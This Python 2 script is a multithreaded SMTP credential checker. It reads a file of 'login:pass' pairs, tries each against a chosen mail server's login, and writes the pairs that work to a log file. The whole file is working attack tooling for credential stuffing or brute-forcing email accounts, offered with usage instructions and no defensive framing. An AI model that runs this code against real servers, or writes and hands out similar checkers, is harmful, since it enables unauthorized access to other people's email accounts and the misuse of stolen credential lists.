from sys import argv
import smtplib
import threading
import argparse
from termcolor import colored

USAGE ="""script.py single threads server port username_full password
script.py list threads server port filename{login:pass} logfilename [-v]"""

results = []
gcount = 0
mutex = threading.Lock()
gindex = 0
verbose = False

def getindex():
    global gindex
    gindex += 1
    return gindex

def check(handler,user, password):
    try:
        log = handler.login(user,password)
        return True
    except:
        return False


def worker(acc_list, server, port):
    result = []
    count = 0
    global verbose
    for account in acc_list:
        res = False
        try:
            for dummy in range(3):
                handler = smtplib.SMTP()
                currsor = handler.connect(server,int(port))
                res = check(handler,account[0],account[1])
                if res == True:
                    handler.quit()
                    break
        except:
            continue
        if verbose==True or res==True:
            print ("[%s] checking email '%s' & pass '%s': %s" % (getindex(),account[0],account[1],colored("[OK]","green") if res==True else colored("-","yellow")))
        if res == True:
            result.append(account)
            count += 1
    mutex.acquire()
    try:
        results.append(result)
        global gcount
        gcount += count
    finally:
        mutex.release()
    #print "exiting"


if len(argv) == 1:
    print USAGE
else:
    action = argv[1]
    threadscount = int(argv[2])
    SERVER = argv[3]
    PORT = argv[4]
    handler = smtplib.SMTP()
    currsor = handler.connect(SERVER,int(PORT))
 
    if action == 'single':
    	USER = argv[5]
    	PASSWORD = argv[6]
        print ("checking email '%s' & pass '%s': %s" % (USER,PASSWORD, colored("[OK]","green") if check(handler,USER,PASSWORD) == True  else colored("-","yellow")))
    else:
        logfilename = argv[6]
        logfile = open(logfilename,'wt')
        FILENAME = argv[5]
        if len(argv) == 8:
            verbose = True            
        f = open (FILENAME,'rt')
        res = False
        tasks = map(lambda dummy:[],range(threadscount))
        currentthread = 0
        for index, line in enumerate(f.readlines()):
            try:
                account = line.strip().split(':')
            except:
                break
            tasks[currentthread].append(account)
            currentthread += 1
            if currentthread == threadscount:
                currentthread = 0
        threads = map (
                        lambda x: threading.Thread(
                                            target=worker,
                                            args=(tasks[x],SERVER,PORT)
                                        ),
                                        range(threadscount)
                                    )
        for thread in threads:
            #print thread.name
            thread.start()
        for thread in threads:
            thread.join()
            #print "thread {0} joined".format(thread.name)

        for result in results:
            for item in result:
                logfile.write("%s:%s\n"%(item[0],item[1]))
        logfile.close()
        print "succsess count = %s " % gcount

